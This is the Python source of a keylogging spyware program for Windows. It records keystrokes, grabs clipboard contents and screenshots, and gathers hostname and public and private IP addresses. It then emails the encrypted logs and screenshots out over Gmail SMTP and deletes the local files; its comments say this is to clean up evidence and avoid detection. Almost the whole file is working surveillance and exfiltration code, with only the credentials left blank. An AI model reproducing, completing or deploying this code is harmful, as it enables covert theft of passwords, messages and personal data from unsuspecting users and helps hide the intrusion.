from email import encoders
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
import smtplib
import socket
import platform
import win32clipboard
from pynput.keyboard import Key, Listener
import time
import os
from cryptography.fernet import Fernet
from requests import get
from PIL import ImageGrab

# Declaring important variables for data storage
keys_info = "key_log.txt"
system_info = "system_info.txt"
clipboard_info = "clipboard.txt"
screenshot_info = "screenshot.png"

# Variables for encryptyed data storage
keys_info_e = "e_key_log.txt"
system_info_e = "e_system_info.txt"
clipboard_info_e = "e_clipboard.txt"

# Amount of seconds for the iteration timer to wait before moving to the next iteration
time_iteration = 1800
num_iterations_end = 4

# Email account the information will be sent to
emailAddress = ""
password = ""
toAddress = ""

# The encryption key
crypt_key = str("")

# File path the data variables will be stored into
file_path = ""
extend = "\\"
file_merge = file_path + extend


# Using MIMEMultipart to automate sending emails, found a couple of great guides on tihs
def send_email(filename, attachment, toAddress):
    fromAddress = emailAddress
    msg = MIMEMultipart()
    msg['From'] = fromAddress
    msg['To'] = toAddress
    msg['Subject'] = "Key log files"
    body = "New log file"
    msg.attach(MIMEText(body, 'plain'))
    filename = filename
    attachment = open(attachment, 'rb')
    p = MIMEBase('application', 'octet-stream')
    p.set_payload(attachment.read())
    encoders.encode_base64(p)
    p.add_header('Content-Disposition', "attachment; filename= %s" % filename)
    msg.attach(p)
    s = smtplib.SMTP('smtp.gmail.com', 587)
    s.starttls()
    s.login(fromAddress, password)
    text = msg.as_string()
    s.sendmail(fromAddress, toAddress, text)
    s.quit()


# Extracts a lot of information about the computer and saves it to the file path
def computer_info():
    with open(file_path + extend + system_info, "a") as f:
        hostname = socket.gethostname()
        ipAddress = socket.gethostbyname(hostname)

        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP Address: " + publicIP + '\n')

        except Exception:
            f.write("Couldn't locate Public IP Address, likely reached max query" + '\n')

        f.write("Processor: " + (platform.processor() + '\n'))
        f.write("System: " + platform.system() + " " + platform.version() + '\n')
        f.write("Machine: " + platform.machine() + '\n')
        f.write("Hostname: " + hostname + '\n')
        f.write("Private IP Address: " + ipAddress + '\n')


# Copy the clipboard and save it to the file path
def copy_clipboard():
    with open(file_path + extend + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pastedData = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()

            f.write("\nClipboard Data: \n" + pastedData + '\n')

        except:
            f.write("Could not copy clipboard")


# Taking a screenshot
def screenshot():
    im = ImageGrab.grab()
    im.save(file_path + extend + screenshot_info)


# Calling all of the spyware modules and emailing the screenshot
copy_clipboard()

computer_info()

screenshot()

# This took a while to get working
num_iterations = 0  # keeps track of how many interations run
currentTime = time.time()  # tracks the time
stoppingTime = time.time() + time_iteration  # tracks the stopping time

while num_iterations < num_iterations_end:  # while statement for the iterations
    count = 0
    keys = []


    def on_press(key):  # the same keylogger code from previous version
        global keys, count, currentTime
        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()
        if count >= 1:
            count = 0
            write_file(keys)
            keys = []


    def write_file(key):
        with open(file_path + extend + keys_info, "a") as f:
            for key in key:
                k = str(key).replace("'", "")
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()


    def on_release(key):
        if currentTime > stoppingTime:  # checks the timer when a key is released
            return False


    with Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()

    if currentTime > stoppingTime:  # takes and emails a screenshot each iteration
        screenshot()
        send_email(screenshot_info, file_path + extend + screenshot_info, toAddress)
        copy_clipboard()
        num_iterations += 1

        currentTime = time.time()
        stoppingTime = time.time() + time_iteration

# Encrypts the text files the keylogger saves from the given key, making it harder to detect
files_encrypt = [file_merge + system_info, file_merge + clipboard_info, file_merge + keys_info]
encrypted_names = [file_merge + system_info_e, file_merge + clipboard_info_e, file_merge + keys_info_e]

count = 0

for encrypting_file in files_encrypt:
    with open(files_encrypt[count], 'rb') as f:
        data = f.read()

    fernet = Fernet(crypt_key)
    encrypted = fernet.encrypt(data)

    with open(encrypted_names[count], 'wb') as f:
        f.write(encrypted)

    send_email(encrypted_names[count], encrypted_names[count], toAddress)
    count += 1

time.sleep(120)

# Deleting files in order to clean up evidence of something going on
delete_files = [system_info, clipboard_info, keys_info, screenshot_info]
for file in delete_files:
    os.remove(file_merge + file)
